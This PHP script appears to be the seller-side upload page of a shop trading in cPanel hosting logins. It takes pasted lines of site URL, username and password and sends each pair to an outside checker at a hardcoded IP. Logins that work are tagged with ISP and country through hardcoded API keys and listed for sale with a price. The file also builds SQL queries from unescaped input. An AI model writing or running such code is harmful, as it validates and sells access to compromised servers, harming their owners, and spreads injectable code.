<?php
error_reporting(0);
session_start();
date_default_timezone_set('UTC');
include "../includes/config.php";

if(!isset($_SESSION['sname']) and !isset($_SESSION['spass'])){
   header("location: ../");
   exit();
}
$usrid = mysqli_real_escape_string($dbcon, $_SESSION['sname']);
$uid = mysqli_real_escape_string($dbcon, $_SESSION['sname']);
?>
<?php
preg_match_all("/(\n)/", $_POST['text'], $matches);
    $total_lines = count($matches[0]) + 1;
	if ($total_lines > 30) { echo "limit reached"; } else { 
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}

 $date = date('d/m/Y H:i:s a');
  $uid = mysqli_real_escape_string($dbcon, $_SESSION['sname']);
$site = explode("\n", $_POST['inputs']);
$price = mysqli_real_escape_string($dbcon, $_POST['price']);
	function srl($item)
		{
		$item0 = $item;
		$item1 = rtrim($item0);
		$item2 = ltrim($item1);
		return $item2;
		} 
$i = 1;

foreach ($site as $k) {
    $k = @trim($k);
			$d = explode("|", $k);
		$url = srl($d[0]);
		$login = srl($d[1]);
		$pass = srl($d[2]);
		
				$o = parse_url($url, PHP_URL_HOST);
		$cp1 = "$o";
	
 $qq = @mysqli_query($dbcon, "SELECT * FROM cpanels") or die("error here");
 $already = @mysqli_query($dbcon, "SELECT * FROM cpanels where sold='0' or sold='1'") or die("error here");

/* Attempt MySQL server dbconection. Assuming you are running MySQL
server with default setting (user 'root' with no password) */


	if(isset($_POST['start']) and $_POST['start'] == "work"){
		      if ($price == 0)
{
	echo "[$i]....<b>".htmlspecialchars($ov)."</b> ...... <b>Price is not valid!</b> <br>";
	  ob_flush();
    flush();	
}     
      else if (preg_match('/[^0-9]/', $price)) {
	 			$ov = parse_url($k, PHP_URL_HOST);

	echo "[$i]....<b>".htmlspecialchars($ov)."</b> ...... <b>Price is not valid!</b> <br>";
	      ob_flush();
    flush();
} else {
		$check="SELECT * FROM cpanels WHERE url = '$k' and sold='0'";
$rs = mysqli_query($dbcon,$check);
$data = mysqli_fetch_array($rs, MYSQLI_NUM);
if($data[0] > 1) {
    echo "[$i]....".htmlspecialchars($o)." .. <b>Already Added !</b><br/>";
	      ob_flush();
    flush();
} else {
		$checkz="SELECT * FROM cpanels WHERE url = '$k' and sold='1'";
$rsz = mysqli_query($dbcon,$checkz);
$dataz = mysqli_fetch_array($rsz, MYSQLI_NUM);
if($dataz[0] > 1) {
    echo "[$i]....".htmlspecialchars($o)." .. <b>Already Added !</b><br/>";
	      ob_flush();
    flush();
} else {	
		ini_set('max_execution_time', 10);
$urltoapi = "http://46.226.108.66/buyer/apicheckcp.php?cp12=$cp1&login=$login&pass=".rawurlencode($pass)."";
$urltoapi2 = file_get_contents($urltoapi);
	if (preg_match('#CP Work#', $urltoapi2))
		{
$o = parse_url($url, PHP_URL_HOST);
		$oip = gethostbyname($o);
		$iptohosting = "https://api.ipgeolocation.io/ipgeo?apiKey=b4692370f68e4c398039408226e6f99f&ip=$oip&fields=isp";
		$creatorhosting = file_get_contents($iptohosting);
		$hostingg = ambilkata($creatorhosting, '{"ip":"'.$oip.'","isp":"', '"}');
		$iptolocation = "http://api.ipstack.com/$o?access_key=f991d31642a29f8a8197b57ef76f167b&fields=country_name";
		$creatorlocation = file_get_contents($iptolocation);
		$country = ambilkata($creatorlocation, '{"country_name":"', '"}');
		$date = date('d/m/Y h:i:s a');
		$uid = mysqli_real_escape_string($dbcon, $_SESSION['sname']);
		mysqli_query($dbcon, "INSERT INTO cpanels
  (acctype,country,infos,url,price,sold,sto,dateofsold,resseller,date,reported)
  VALUES
  ('cpanel','$country','$hostingg','$k','$price','0','','','$uid','$date','')") or die(mysqli_error($dbcon));
    echo "[$i]....".htmlspecialchars($o)." .. <font color=green>[Added]</font><br/>";
	      ob_flush();
    flush();
				} else {  
    echo "[$i]....".htmlspecialchars($o)." .. <b><font>Not Working !</font></b><br/>";
	      ob_flush();
    flush();
		}
	} 	$i++;

	} }  } } }
?>
